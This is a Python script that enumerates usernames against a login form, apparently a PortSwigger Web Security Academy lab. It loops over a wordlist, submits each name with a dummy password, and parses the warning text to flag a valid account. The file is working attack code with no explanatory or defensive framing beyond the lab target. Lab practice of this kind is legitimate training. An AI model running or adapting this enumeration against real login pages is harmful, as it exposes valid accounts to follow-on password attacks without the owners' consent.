import requests
import sys
from bs4 import BeautifulSoup

# Vulnerable Reponse! 
# <section>
# <p class=is-warning>Invalid username</p>
# <form class=login-form method=POST action="/login">
#     <label>Username</label>
#     <input required type=username name="username" autofocus>
#     <label>Password</label>
#     <input required type=password name="password">
#     <button class=button type=submit> Log in </button>
# </form>
# </section>

# Login URL !!!
url = 'https://0aa500d804e3f93f80cef34e00180053.web-security-academy.net/login'
wordlistPath = './user.txt'

#----------------------------------------------------------------

# Read user list from file and return list of usernames.
def readUserToList(wordlistPath):
    list = []
    try:
        with open(wordlistPath, 'r') as wordlist:
            for line in wordlist:
                list.append(line.strip()) #remove "/n"
            wordlist.close()
        return list
    except FileNotFoundError:
        print("Wordlist Not Found", wordlistPath)

userlist = readUserToList(wordlistPath)
print("Testing User -> " , userlist)


#----------------------------------------------------------------

# Test with a valid username and password
index = 0
for user in userlist:

    payload = {
        'username':user,
        'password':'EeeorPasswords'
    }

    response = requests.post(url,payload)
    soupParser = BeautifulSoup(response.text,'html.parser')

    grepExtract = soupParser.find('p',class_='is-warning')
    if grepExtract is not None:
        if (grepExtract.text != 'Invalid username'):
            print("Valid Username found! UserName is:",user,"Grep->",grepExtract.text)
            sys.exit()
        else:
            print("Attempt req:", index, "Grep->",grepExtract.text,user)
    else:
        print("May URL is Wrong! or Tags is Worng!, Please try again!")
    index = index + 1


